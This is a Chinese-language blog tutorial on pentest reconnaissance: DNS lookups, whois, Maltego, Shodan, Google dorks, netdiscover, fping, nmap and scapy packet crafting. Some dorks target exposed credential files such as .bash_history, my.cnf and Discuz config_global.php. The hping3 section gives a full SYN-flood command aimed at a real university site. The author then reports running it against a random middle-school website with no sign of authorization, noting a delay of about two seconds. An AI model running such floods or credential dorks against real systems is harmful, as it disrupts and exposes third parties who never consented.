+<h2 id="DNS信息收集-NSLOOKUP"><a href="#DNS信息收集-NSLOOKUP" class="headerlink" title="DNS信息收集-NSLOOKUP"></a>DNS信息收集-NSLOOKUP</h2><p>将域名解析为IP地址</p>
+<h3 id="ping-命令"><a href="#ping-命令" class="headerlink" title="ping 命令"></a>ping 命令</h3> <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">┌──(root㉿debian)-[/home/admin1]<br>└─#<span class="hljs-built_in"> ping </span>baidu.com -c 3                                                      <span class="hljs-built_in"></span><br><span class="hljs-built_in">PING </span>baidu.com (110.242.68.66) 56(84) bytes of data.<br>64 bytes <span class="hljs-keyword">from</span> 110.242.68.66: <span class="hljs-attribute">icmp_seq</span>=1 <span class="hljs-attribute">ttl</span>=128 <span class="hljs-attribute">time</span>=37.2 ms<br>64 bytes <span class="hljs-keyword">from</span> 110.242.68.66: <span class="hljs-attribute">icmp_seq</span>=2 <span class="hljs-attribute">ttl</span>=128 <span class="hljs-attribute">time</span>=36.9 ms<br>64 bytes <span class="hljs-keyword">from</span> 110.242.68.66: <span class="hljs-attribute">icmp_seq</span>=3 <span class="hljs-attribute">ttl</span>=128 <span class="hljs-attribute">time</span>=36.8 ms<br></code></pre></td></tr></table></figure>
+
+<h3 id="使用nslookup-查看域名"><a href="#使用nslookup-查看域名" class="headerlink" title="使用nslookup 查看域名"></a>使用nslookup 查看域名</h3> <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">┌──(root㉿debian)-[/home/admin1]</span><br><span class="hljs-string">└─#</span> <span class="hljs-string">nslookup</span> <span class="hljs-string">www.baidu.com</span>                                                   <br><span class="hljs-attr">Server:</span>         <span class="hljs-number">192.168</span><span class="hljs-number">.201</span><span class="hljs-number">.2</span><br><span class="hljs-attr">Address:</span>        <span class="hljs-number">192.168</span><span class="hljs-number">.201</span><span class="hljs-number">.2</span><span class="hljs-comment">#53</span><br><br><span class="hljs-attr">Non-authoritative answer:</span><br><span class="hljs-string">www.baidu.com</span>   <span class="hljs-string">canonical</span> <span class="hljs-string">name</span> <span class="hljs-string">=</span> <span class="hljs-string">www.a.shifen.com.</span><br><span class="hljs-attr">Name:</span>   <span class="hljs-string">www.a.shifen.com</span>  <span class="hljs-comment">#百度别名shifen</span><br><span class="hljs-attr">Address:</span> <span class="hljs-number">120.232</span><span class="hljs-number">.145</span><span class="hljs-number">.185</span><br><span class="hljs-attr">Name:</span>   <span class="hljs-string">www.a.shifen.com</span><br><span class="hljs-attr">Address:</span> <span class="hljs-number">183.240</span><span class="hljs-number">.98</span><span class="hljs-number">.161</span><br><span class="hljs-attr">Name:</span>   <span class="hljs-string">www.a.shifen.com</span><br><span class="hljs-attr">Address:</span> <span class="hljs-number">2409</span><span class="hljs-string">:8c54:870:67:0:ff:b0c2:ad75</span><br><span class="hljs-attr">Name:</span>   <span class="hljs-string">www.a.shifen.com</span><br><span class="hljs-attr">Address:</span> <span class="hljs-number">2409</span><span class="hljs-string">:8c54:870:34e:0:ff:b024:1916</span><br><br></code></pre></td></tr></table></figure>
+
+
+<h3 id="DNS-信息收集-DIG"><a href="#DNS-信息收集-DIG" class="headerlink" title="DNS 信息收集-DIG"></a>DNS 信息收集-DIG</h3><p>语法 dig(选项) 需要查询的域名<br>@&lt;DNS服务器地址&gt;：指定进行域名解析的域名服务器<br>any #显示所有类型的域名记录，默认只显示A记录<br><img src="/images/F6AA9A1A37AD4205BE4BF45741BD5AD0.png" srcset="/img/loading.gif" lazyload></p>
+<p>指定DNS服务器解析<br><img src="/images/D6964F99C6D34a66919DE0FFC5E7912D.png" srcset="/img/loading.gif" lazyload></p>
+<p>查询所有类型域名记录<br><img src="/images/E051F5AD6F374ae68BBFE85A3429570B.png" srcset="/img/loading.gif" lazyload></p>
+<p>dig -x IP 反向解析域名<br><img src="/images/D0842BB8A0674d03B6E662ECD196E626.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/4450A6200B92436bACB3AE910C213E8C.png" srcset="/img/loading.gif" lazyload></p>
+<p>查询DNS服务器bind版本信息<br>查询DNS版本信息的目的：可以通过版本信息来查找相关版本漏洞的利用方式<br>例：查看dnspod的域名服务器 ns3.dnsv.com使用bind的软件版本信息<br>dig txt chaos VERSION.BIND @ns3.dnsv4.com<br>txt : 记录类型文本<br>chaos ：类级别<br>VERSION.BIND ：版本信息<br><img src="/images/E72187F43B2042e09E864C20660F2CF9.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="查询网站的域名注册信息和备案信息"><a href="#查询网站的域名注册信息和备案信息" class="headerlink" title="查询网站的域名注册信息和备案信息"></a>查询网站的域名注册信息和备案信息</h2><h3 id="Whois-查询方式-Web-接口查询和-Whois-命令查询"><a href="#Whois-查询方式-Web-接口查询和-Whois-命令查询" class="headerlink" title="Whois 查询方式 Web 接口查询和 Whois 命令查询"></a>Whois 查询方式 Web 接口查询和 Whois 命令查询</h3><h4 id="通过Web接口查询"><a href="#通过Web接口查询" class="headerlink" title="通过Web接口查询"></a>通过Web接口查询</h4><p>这里只是举例2个其实有很多<br>阿里云：<a target="_blank" rel="noopener" href="https://whois.aliyun.com/">https://whois.aliyun.com/</a><br>站长之家：<a target="_blank" rel="noopener" href="https://whois.chinaz.com/">https://whois.chinaz.com/</a></p>
+<h4 id="Whois命令查询"><a href="#Whois命令查询" class="headerlink" title="Whois命令查询"></a>Whois命令查询</h4><p>whois后面的域名应为顶级域名<br><img src="/images/E3FA34FBA2FF4a8b92F5221FA48CF83C.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="备案信息查询"><a href="#备案信息查询" class="headerlink" title="备案信息查询"></a>备案信息查询</h3><h4 id="web接口查询"><a href="#web接口查询" class="headerlink" title="web接口查询"></a>web接口查询</h4><p>站长之家：<a target="_blank" rel="noopener" href="https://icp.chinaz.com/">https://icp.chinaz.com/</a><br>天眼查：<a target="_blank" rel="noopener" href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></p>
+<h2 id="使用-Maltego-收集子域名信息"><a href="#使用-Maltego-收集子域名信息" class="headerlink" title="使用 Maltego 收集子域名信息"></a>使用 Maltego 收集子域名信息</h2><p>该工具的主要重点是分析通过互联网访问的数据之间的真实世界关系，其中包括足迹互联网基础设施和收集有关拥有该网络的人员和组织的数据。通过使用OSINT(开源情报)技术，通过查询whois记录，社交网络，DNS记录，不同的在线API，提取元数据和搜索引擎来搜索这些数据之间的连接。该工具将提供广泛的图形布局结果，允许对数据进行聚类，使关系准确和即时。</p>
+<h3 id="子域名介绍"><a href="#子域名介绍" class="headerlink" title="子域名介绍"></a>子域名介绍</h3><p>顶级域名是域名的最后一个部分，既是域名最后一点之后的字母，例如在<code>http://example.com</code>这个域名中，顶级域名是.com(或.COM)大小写视为相同。</p>
+<p><strong>常见的顶级域主要分两类</strong></p>
+<ol>
+<li><p>通用顶级类别域名共6个，包括用于科研机构的.ac;用于工商金融企业的.com;用于教育机构的.edu;用于政府部门的.gov;用于互联网络信息中心和运行中心的.net;用于非盈利组织的.org。</p>
+</li>
+<li><p>国家及地区顶级域，如.cn 代表中国，.uk代表英国等，地理顶级域名一般由各个国家或地区负责管理</p>
+</li>
+</ol>
+<p>子域名(Subdomain Name),凡顶级域名前加前缀的都是该顶级域名的子域名，而子域名根据技术的多少分为二级子域名，三级子域名以及多级子域名。</p>
+<h3 id="挖掘子域名的重要性"><a href="#挖掘子域名的重要性" class="headerlink" title="挖掘子域名的重要性"></a>挖掘子域名的重要性</h3><p>子域名是某个主域的二级域名或者多级域名，在防御措施严密情况下无法直接拿下主域，那么就可以采用迂回战术拿下子域名，然后无限靠近主域。</p>
+<p>例如：<a target="_blank" rel="noopener" href="http://www.xxxxx.com/">www.xxxxx.com</a> 主域不存在漏洞，并且防护措施严密，而二级域名 edu.xxxxx.com存在漏洞，并且防护措施松散。</p>
+<ol>
+<li>子域名挖掘工具：Maltego 子域名挖掘机。</li>
+<li>搜索引擎挖掘 如：在Google中输入 side:qq.com</li>
+<li>第三方网站查询：<a target="_blank" rel="noopener" href="http://tool.chinaz.com/subdomain">http://tool.chinaz.com/subdomain</a>、<a target="_blank" rel="noopener" href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></li>
+<li>证书透明度公开日志枚举：<a target="_blank" rel="noopener" href="https://crt.sh/">https://crt.sh/</a>、<a target="_blank" rel="noopener" href="http://censys.io/">http://censys.io/</a></li>
+<li>其它途径：<a target="_blank" rel="noopener" href="http://dns.aizhan.com/">http://dns.aizhan.com</a></li>
+</ol>
+<h3 id="使用MAltego-CE进行子域名挖掘"><a href="#使用MAltego-CE进行子域名挖掘" class="headerlink" title="使用MAltego CE进行子域名挖掘"></a>使用MAltego CE进行子域名挖掘</h3><p>先翻墙后，再注册，因为注册过程的验证码是google的技术，不翻墙使用不了<br>注册网址<a target="_blank" rel="noopener" href="https://www.paterva.com/web7/community/community.php">https://www.paterva.com/web7/community/community.php</a></p>
+<p>注册好后，kali内置了maltego，点击左上角<br>进入后选择<br><img src="/images/00988EF783D14d4f94C33F7078143299.png" srcset="/img/loading.gif" lazyload><br>然后在跳出来的窗口登录</p>
+<p>都完成之后，给出了一个空白画布<br>左边search domain 选择domain<br><img src="/images/16D8B877603E4211914A55B96765E901.png" srcset="/img/loading.gif" lazyload><br>按住鼠标左键拖拽到画布上<br>比如选择查找hut官网下的<br><img src="/images/198D87E3A3F421599274B72D5D2C883.png" srcset="/img/loading.gif" lazyload><br>右键选择 all transforms-&gt; to dns name(interesting)[security trails]<br><img src="/images/CE96DA289BC94c9b86C1DA1BD028197A.png" srcset="/img/loading.gif" lazyload><br>直接选择all transforms还是感觉子域名显示的不完全，而且有很多子域名是无效的</p>
+<h2 id="使用shodan信息收集"><a href="#使用shodan信息收集" class="headerlink" title="使用shodan信息收集"></a>使用shodan信息收集</h2><h3 id="shodan介绍"><a href="#shodan介绍" class="headerlink" title="shodan介绍"></a>shodan介绍</h3><p>shodan搜索引擎概述：<br>虽然目前人们都认为谷歌是最强劲的搜索引擎，但shodan才是互联网上最可怕的搜索引擎。与谷歌不同的是，shodan不是在网上搜索网址，而是直接进入互联网背后的通道。shodan可以说是一款“黑暗”谷歌，一刻不停的在寻找着所有和互联网关联的服务器、摄像头、打印机、路由器等等。还可以直接显示出目标的具体地理位置信息。</p>
+<p>shodan官网：<a target="_blank" rel="noopener" href="https://www.shodan.io/">https://www.shodan.io/</a></p>
+<h3 id="shodan搜索技巧"><a href="#shodan搜索技巧" class="headerlink" title="shodan搜索技巧"></a>shodan搜索技巧</h3><h4 id="技巧一：通过shodan搜索Webcam网络摄像头设备"><a href="#技巧一：通过shodan搜索Webcam网络摄像头设备" class="headerlink" title="技巧一：通过shodan搜索Webcam网络摄像头设备"></a>技巧一：通过shodan搜索Webcam网络摄像头设备</h4><p>在搜索框中输入“webcam”或“网络摄像头”进行搜索。<br>有些摄像头是能打开的有些打不开</p>
+<h4 id="技巧二：shodan搜索指定IP地址"><a href="#技巧二：shodan搜索指定IP地址" class="headerlink" title="技巧二：shodan搜索指定IP地址"></a>技巧二：shodan搜索指定IP地址</h4><p>格式为net:IP<br><img src="/images/ADDD9BE3828647d0BECA9146D637A5A3.png" srcset="/img/loading.gif" lazyload><br>点进去之后可以看详细信息<br>比如端口开放，框架使用，端口对应服务，服务版本</p>
+<h4 id="技巧三：shodan搜索具体城市"><a href="#技巧三：shodan搜索具体城市" class="headerlink" title="技巧三：shodan搜索具体城市"></a>技巧三：shodan搜索具体城市</h4><p>搜索栏中输入city:beijing 就可以搜索出北京的联网设备，我们可以和port进行组合查询<br>输入 city:beijing port:80 我们可以搜索到北京开放80端口的设备</p>
+<h2 id="Google搜索引擎的使用技巧"><a href="#Google搜索引擎的使用技巧" class="headerlink" title="Google搜索引擎的使用技巧"></a>Google搜索引擎的使用技巧</h2><p>我们通常使用搜索引擎都是直接搜索自己想要的内容，正常情况下我们都是直接使用语言进行描述问题来进行搜索，然后搜索引擎也有特定语法可以使用，熟练掌握搜索引擎的语法可以让你的搜索效率和准确率大幅度提升，当然我们学习这种技巧是为了寻找存在漏洞的页面，或者存在敏感信息的文件。</p>
+<h3 id="Google常用语法说明"><a href="#Google常用语法说明" class="headerlink" title="Google常用语法说明"></a>Google常用语法说明</h3><p>site—————-指定域名<br>inurl—————URL中存在的关键字页面<br>intext————–网页内容里面的关键字<br>Filetype————指定文件类型<br>intitle————-网页标题中的关键字<br>link—————-返回你所有的指定域名链接<br>info—————-查找指定站点信息<br>cache—————搜索Google里的内容缓存</p>
+<h4 id="site使用"><a href="#site使用" class="headerlink" title="site使用"></a>site使用</h4><p><img src="/images/AC436981EB9948d481A627CCF98EBB23.png" srcset="/img/loading.gif" lazyload><br>或者可以查看指定国家的网页<br><img src="/images/20E2D9109CFF418aA52E1C6FC8A29E04.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="inurl使用"><a href="#inurl使用" class="headerlink" title="inurl使用"></a>inurl使用</h4><p>inurl,拆开来，就是in url，它的作用是限定在url中搜索。<br>就是在url中查找关键字<br><img src="/images/035DB6F741CC4084AA39025A7B05CD03.png" srcset="/img/loading.gif" lazyload><br>还有就是这个功能可以找后台，如图<br><img src="/images/B1F36CC4B2BF41e2A2D680F870AF994D.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="intitle使用"><a href="#intitle使用" class="headerlink" title="intitle使用"></a>intitle使用</h4><p>可以查看指定的页面名<br><img src="/images/69C3A042BC384e7eBC9AFBB17987F3A4.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="index-of-bash-history"><a href="#index-of-bash-history" class="headerlink" title="index.of .bash_history"></a>index.of .bash_history</h5><p>index.of 表示包含index.of字段，出现该字段表示网站目录是对我们开放的，我们可以查看到网站目录下的所有文件信息。</p>
+<p>.bash_histroy 表示我们要筛选的文件名称，也可以替换成其他的敏感信息文件，该文件记录了用户的历史命令记录。</p>
+<p>my.cnf 是mysql的配置文件名称，可与index.of配合<br><img src="/images/8628BFE53BDB43f78D14FD620607FF91.png" srcset="/img/loading.gif" lazyload><br><img src="/images/5EDA4DDE2BBC4fa0A768DE8A6482E5E1.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="查找discuz论坛中存储mysql密码的配置文件config-global-php"><a href="#查找discuz论坛中存储mysql密码的配置文件config-global-php" class="headerlink" title="查找discuz论坛中存储mysql密码的配置文件config_global.php"></a>查找discuz论坛中存储mysql密码的配置文件config_global.php</h5><p><img src="/images/D8EF77F6051549e09E94B3B4343E8C2E.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="cache的使用"><a href="#cache的使用" class="headerlink" title="cache的使用"></a>cache的使用</h4><p>cache返回的结果是被搜索引擎收录时的页面，比如一些页面被删除了，我们通过cache还是可以访问。类似于VMware里的快照，可以用来看一些在新版本中删除的内容</p>
+<h4 id="filetype-torrent-kali"><a href="#filetype-torrent-kali" class="headerlink" title="filetype:torrent kali"></a>filetype:torrent kali</h4><p>kali是我们要搜索的关键字<br>filetype指定文件类型<br>torrent文件类型名称，torrent是种子文件，可以填写任意扩展名。<br><img src="/images/D3F555CCC6434f58AC69E07A45214E05.png" srcset="/img/loading.gif" lazyload><br><img src="/images/0BB48D2AE7EC450aA20383FE966B6366.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="谷歌黑客数据库"><a href="#谷歌黑客数据库" class="headerlink" title="谷歌黑客数据库"></a>谷歌黑客数据库</h3><p>记录了谷歌搜索语法以及搜索功能<br>传送门–&gt;<a target="_blank" rel="noopener" href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a></p>
+<p><img src="/images/BA6AD4A4DB5A4db2AC85123DF62A07F4.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="常见最新漏洞公布网站"><a href="#常见最新漏洞公布网站" class="headerlink" title="常见最新漏洞公布网站"></a>常见最新漏洞公布网站</h2><p>美国著名安全公司 Offensive Security的漏洞库 <a target="_blank" rel="noopener" href="https://www.exploit-db.com/">https://www.exploit-db.com/</a>比较及时</p>
+<p>国家信息安全漏洞共享平台<a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/">https://www.cnvd.org.cn/</a></p>
+<p>绿盟科技<a target="_blank" rel="noopener" href="http://www.nsfocus.net/">http://www.nsfocus.net/</a></p>
+<p>俄罗斯知名安全实验室<a target="_blank" rel="noopener" href="https://www.securitylab.ru/vulnerability/">https://www.securitylab.ru/vulnerability/</a></p>
+<p>CVE常见漏洞和披露<a target="_blank" rel="noopener" href="https://cve.mitre.org/">https://cve.mitre.org/</a></p>
+<p>信息安全漏洞门户<a target="_blank" rel="noopener" href="https://www.vulhub.org.cn/index">https://www.vulhub.org.cn/index</a></p>
+<p>安全客<a target="_blank" rel="noopener" href="https://www.anquanke.com/">https://www.anquanke.com/</a></p>
+<p>美国国家信息安全漏洞库<a target="_blank" rel="noopener" href="https://nvd.nist.gov/">https://nvd.nist.gov/</a></p>
+<p>知道创宇漏洞库<a target="_blank" rel="noopener" href="https://www.seebug.org/">https://www.seebug.org/</a></p>
+<h1 id="信息收集–主动"><a href="#信息收集–主动" class="headerlink" title="信息收集–主动"></a>信息收集–主动</h1><h2 id="主动信息收集的原理"><a href="#主动信息收集的原理" class="headerlink" title="主动信息收集的原理"></a>主动信息收集的原理</h2><h3 id="主动信息收集的特点"><a href="#主动信息收集的特点" class="headerlink" title="主动信息收集的特点"></a>主动信息收集的特点</h3><ol>
+<li><p>直接与目标系统交互通信</p>
+</li>
+<li><p>无法避免留下访问的痕迹</p>
+</li>
+<li><p>使用受控的第三方电脑进行探测，使用代理或已经被控制的机器，做好被封杀的准备</p>
+</li>
+<li><p>扫描发送不同的探测，根据返回结果判断目标状态</p>
+</li>
+</ol>
+<h3 id="发现目标主机的过程"><a href="#发现目标主机的过程" class="headerlink" title="发现目标主机的过程"></a>发现目标主机的过程</h3><ol>
+<li><p>识别存活主机，发现潜在的被攻击目标</p>
+</li>
+<li><p>输出一个IP地址列表比如IP地址段IP地址范围</p>
+</li>
+<li><p>使用二、三、四层进行探测发现</p>
+</li>
+</ol>
+<h2 id="基于ping命令的探测"><a href="#基于ping命令的探测" class="headerlink" title="基于ping命令的探测"></a>基于ping命令的探测</h2><h3 id="PING"><a href="#PING" class="headerlink" title="PING"></a>PING</h3><p>PING命令是我们常用的判断主机之间网络是否畅通，同样也是能判断我们的目标主机是否存活。</p>
+<p>ping iP or 域名 -c 1   -c 后面跟数字表示返回几个结果</p>
+<h3 id="ARPING"><a href="#ARPING" class="headerlink" title="ARPING"></a>ARPING</h3><p>ARP协议概述：ARP协议是“Address Resolution Protocol”(地址解析协议)的缩写。计算机通过ARP协议将IP地址转换成MAC地址。</p>
+<h4 id="ARP协议工作原理"><a href="#ARP协议工作原理" class="headerlink" title="ARP协议工作原理"></a>ARP协议工作原理</h4><p>在以太网中，数据传输的目标地址是MAC地址，一个主机要和另一个主机进行直接通信，必须要知道目标主机的MAC地址。</p>
+<p>计算机使用者通常只知道目标机器的IP信息，“地址解析”就是主机在发送帧前将目标IP地址转换成目标MAC地址的过程。</p>
+<p>简单地说，ARP协议主要负责将局域网中的32位IP地址转换为对应的48位物理地址，即网卡的MAC地址，保障通信顺利进行</p>
+<h4 id="使用arping命令查看局域网中的IP是否有冲突"><a href="#使用arping命令查看局域网中的IP是否有冲突" class="headerlink" title="使用arping命令查看局域网中的IP是否有冲突"></a>使用arping命令查看局域网中的IP是否有冲突</h4><p>┌──(root㉿debian)-[&#x2F;home&#x2F;admin1&#x2F;Desktop]<br>└─# arping 192.168.201.2 -c 1 #arping后跟网关，-c 我们只需一次就好<br>ARPING 192.168.201.2<br>60 bytes from 00:50:56:f7:da:f9 (192.168.201.2): index&#x3D;0 time&#x3D;7.692 usec</p>
+<h3 id="使用netdiscover进行被动方式探测局域中存活的机器"><a href="#使用netdiscover进行被动方式探测局域中存活的机器" class="headerlink" title="使用netdiscover进行被动方式探测局域中存活的机器"></a>使用netdiscover进行被动方式探测局域中存活的机器</h3><p>netdiscover是一个主动&#x2F;被动的ARP侦察工具。使用netdiscover工具可以在网络上扫描IP地址，检查在线主机或搜索为它们发送的ARP请求。</p>
+<p>主动模式：<br>主动模式顾名思义就是主动的探测发现网络，但是这种方式往往会引起网络管理员的注意<br>netdiscover -i eth0<br>-i 指定网卡<br>-r 指定网段&#x2F;24子网掩码<br>┌──(root㉿debian)-[&#x2F;home&#x2F;admin1&#x2F;Desktop]<br>└─# netdiscover -i eth0 -r 192.168.201.0&#x2F;24<br><img src="/images/DB8BC54F91BD499e9F8741B4FEB15B2.png" srcset="/img/loading.gif" lazyload></p>
+<p>被动模式：<br>被动模式的方法更加隐蔽，但是速度会比较慢，网卡被设置为混杂模式来侦听网络内的arp数据包进行被动式探测，这种方式就需要网络内设备发送arp包才能被探测到。</p>
+<p>┌──(root㉿debian)-[&#x2F;home&#x2F;admin1&#x2F;Desktop]<br>└─# netdiscover -p</p>
+<h3 id="HPING3"><a href="#HPING3" class="headerlink" title="HPING3"></a>HPING3</h3><p>hping3 是一个命令行下使用德TCP&#x2F;IP数据包组装&#x2F;分析工具，通常web服务会用来做压力测试使用，也可以进行DOS攻击的实验，同样Hping只能每次扫描一个目标。</p>
+<p>例：使用HPING进行压力测试<br>先测试网站正常访问<br>一下子有点犯难了哈哈</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>****.hut.edu.cn/<br></code></pre></td></tr></table></figure>
+
+<p>对上面网址压力测试</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">hping3 -c <span class="hljs-number">1000</span> -d <span class="hljs-number">120</span> -S -w <span class="hljs-number">64</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">80</span> <span class="hljs-attr">--flood</span> <span class="hljs-attr">--rand-source</span> ****<span class="hljs-selector-class">.hut</span><span class="hljs-selector-class">.edu</span><span class="hljs-selector-class">.cn</span><br><br>-c <span class="hljs-number">1000</span>         = 发送的数据包的数量<br>-d <span class="hljs-number">120</span>          = 发送到目标机器的每个数据包的大小。单位是字节<br>-S              = 只发送SYN数据包<br>-w <span class="hljs-number">64</span>           = TCP窗口大小<br>-<span class="hljs-selector-tag">p</span> <span class="hljs-number">80</span>           = 目的地端口(<span class="hljs-number">80</span>是WEB端口)。在这里可以使用任何端口。<br><span class="hljs-attr">--flood</span>         = 尽可能快地发送数据包，不需要考虑显示入站回复。洪水攻击模式。<br><span class="hljs-attr">--rand-source</span>   = 使用随机性的源头IP地址。只是在局域中伪造。通过路由器后，还会还原成真实的IP地址。<br></code></pre></td></tr></table></figure>
+<p>用wireshark抓包<br>可能是因为学校的网站性能较好把，在执行后应该会让网站瘫痪一会的，应该换个小一点的网站。。。但大脑短路了，不知道去哪找<br><img src="/images/36F8D1998A1249b2AD0E0F01836A3B5B.png" srcset="/img/loading.gif" lazyload><br>随便找了个中学网站，测试下，貌似是成功了，延时了2s左右，应该没有更合适的网站了</p>
+<h3 id="使用FPING查看局域中运行了哪些机器"><a href="#使用FPING查看局域中运行了哪些机器" class="headerlink" title="使用FPING查看局域中运行了哪些机器"></a>使用FPING查看局域中运行了哪些机器</h3><p>Fping就是ping命令的加强版他可以对一个IP段进行ping扫描，而ping命令本身是不可以对网段进行扫描的。<br>fping -g 192.168.201.1 192.168.201.254 -c 1 &gt; fff.txt<br>类似于下面的就是存活的主机<br><img src="/images/40B0D889931F448bA6B4A869D2FEA444.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="基于-Nmap-的扫描方式"><a href="#基于-Nmap-的扫描方式" class="headerlink" title="基于 Nmap 的扫描方式"></a>基于 Nmap 的扫描方式</h2><h3 id="Nmap-的基本扫描方式"><a href="#Nmap-的基本扫描方式" class="headerlink" title="Nmap 的基本扫描方式"></a>Nmap 的基本扫描方式</h3><p>Nmap，也就是 Network Mapper，最早是Linux下的网络扫描和嗅探工具包</p>
+<p>例：扫描 192.168.201.0 这个网段</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">nmap</span> -<span class="hljs-keyword">sn</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">201.0</span>/<span class="hljs-number">24</span><br>或<br><span class="hljs-keyword">nmap</span> -<span class="hljs-keyword">sn</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">201.1</span>-<span class="hljs-number">254</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/B02567C1F1134994A14B29D5F59D4D12.png" srcset="/img/loading.gif" lazyload></p>
+<p>-sn 参数说明：表示只ping扫描，不进行端口扫描</p>
+<h3 id="使用nmap进行半连接扫描"><a href="#使用nmap进行半连接扫描" class="headerlink" title="使用nmap进行半连接扫描"></a>使用nmap进行半连接扫描</h3><p>nmap扫描类型主要有TCP的全连接扫描(会在被扫描机器留下记录)，半连接扫描(不会留下记录)</p>
+<p>nmap -sS ip -p 端口,端口,端口<br><img src="/images/B1AE2F3E8FDA46ee9F75ECCE0D227E6B.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="实战一—使用scapy定制数据包进行高级扫描"><a href="#实战一—使用scapy定制数据包进行高级扫描" class="headerlink" title="实战一—使用scapy定制数据包进行高级扫描"></a>实战一—使用scapy定制数据包进行高级扫描</h2><h3 id="scapy概述"><a href="#scapy概述" class="headerlink" title="scapy概述"></a>scapy概述</h3><p>scapy是一个可以让用户发送、侦听和解析并伪装网络报文的python程序，这些功能可以用于制作侦测、扫描和攻击网络的工具</p>
+<h3 id="scapy-定制ARP协议"><a href="#scapy-定制ARP协议" class="headerlink" title="scapy 定制ARP协议"></a>scapy 定制ARP协议</h3><p>终端输入scapy进入scapy程序<br>不用在意报错，不影响使用<br>输入ARP().display来查看ARP函数的用法<br><img src="/images/A42119E134B846b6AC997567B0F2CD8B.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hwtype</span>      =<span class="hljs-number">0</span>x1        硬件类型<br><span class="hljs-attribute">ptype</span>       =<span class="hljs-number">0</span>x800      协议类型<br><span class="hljs-attribute">hwlen</span>       =<span class="hljs-number">6</span>          硬件地址长度(MAC)<br><span class="hljs-attribute">plen</span>        =<span class="hljs-number">4</span>          协议地址长度(IP)<br><span class="hljs-attribute">op</span>          =who-has    who-has查询<br><span class="hljs-attribute">hwsrc</span>       =<span class="hljs-number">00</span>:<span class="hljs-number">0</span>c:<span class="hljs-number">29</span>:<span class="hljs-number">17</span>:<span class="hljs-number">3</span>d:<span class="hljs-number">7</span>f  源MAC地址<br><span class="hljs-attribute">psrc</span>        =<span class="hljs-number">192.168.201.128</span>    源IP地址<br><span class="hljs-attribute">hwdst</span>       =<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>  目标MAC地址<br><span class="hljs-attribute">pdst</span>        =<span class="hljs-number">0.0.0.0</span>    向谁发送查询请求<br></code></pre></td></tr></table></figure>
+
+<p>例：定义向192.168.201.1发送arp请求的数据包<br>sr1函数作用：sr1函数包含了发送数据包和接收数据包的功能。<br><img src="/images/0F2FF3014FD64b1a82016803AF6AA8A2.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="scapy定制PING包"><a href="#scapy定制PING包" class="headerlink" title="scapy定制PING包"></a>scapy定制PING包</h3><p>scapy的功能是非常强大的，前面只是简单的介绍了他的ARP探测方式，下面是IP&#x2F;ICMP的方式</p>
+<p>下面两条命令可以直接看到数据包格式</p>
+<p>ICMP().display()<br><img src="/images/56CE38828FFF427cADB708BFD4186271.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">type</span>    <span class="hljs-operator">=</span>   echo-request    类型，标识ICMP报文的类型<br><span class="hljs-attribute">code</span>    <span class="hljs-operator">=</span>   <span class="hljs-number">0</span>               代码<br><span class="hljs-attribute">chksum</span>  <span class="hljs-operator">=</span>   None            校验和<br><span class="hljs-attribute">id</span>      <span class="hljs-operator">=</span>   <span class="hljs-number">0</span>x0             标识<br><span class="hljs-attribute">seq</span>     <span class="hljs-operator">=</span>   <span class="hljs-number">0</span>x0<br></code></pre></td></tr></table></figure>
+
+
